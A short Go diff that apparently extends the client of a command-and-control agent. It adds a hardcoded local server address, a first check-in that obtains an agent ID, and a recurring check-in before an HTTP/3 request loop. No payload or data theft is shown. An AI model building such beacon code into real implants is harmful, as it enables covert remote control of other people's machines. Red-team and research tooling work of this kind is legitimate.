@@ -12,6 +12,15 @@ import (
 )
 
 func main() {
+	ip := "127.0.0.1"
+	port := "4443"
+	url := fmt.Sprintf("https://%s:%s/", ip, port)
+
+	// Calls first checkin api to get the agent ID
+	ID := FirstCheckin(ip, port)
+
+	checkIn(ip, port, ID)
+	fmt.Println("My Id is", ID)
 	client := &http.Client{
 		Transport: &http3.RoundTripper{
 			TLSClientConfig: &tls.Config{
@@ -21,7 +30,6 @@ func main() {
 		},
 	}
 
-	url := "https://localhost:4443"
 	fmt.Println("[+] Sending HTTP/3 request to:", url)
 
 	for {
